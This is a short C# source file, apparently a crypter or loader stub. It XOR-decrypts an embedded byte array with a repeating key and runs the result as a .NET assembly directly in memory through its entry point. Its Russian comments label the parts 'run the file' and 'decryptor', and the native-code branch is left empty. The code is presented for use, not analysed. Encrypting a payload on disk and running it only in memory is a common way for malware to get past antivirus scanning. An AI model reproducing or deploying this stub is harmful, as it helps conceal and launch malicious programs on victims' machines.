
using System;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace Loader
{
    public class Load
    {
        public static void Start(byte[] file, string key, bool isNative, string args)
        {
            try
            {
                if (!isNative)
                {
                    Assembly.Load(Decrypt(file, key)).EntryPoint.Invoke(null, null); // запускаем файл
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private static byte[] GetBytes(string str)
        {
            var bytes = new byte[str.Length];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(str.ToCharArray()[i]);
            }

            return bytes;
        }

        private static byte[] Decrypt(byte[] data, string pass) // декриптор
        {
            var bytes = GetBytes(pass);
            int num = 0;
            for (int i = 0; i < data.Length; i++)
            {
                data[i] ^= bytes[num++];
                if (num == bytes.Length)
                {
                    num = 0;
                }
            }
            return data;
        }
    }
}
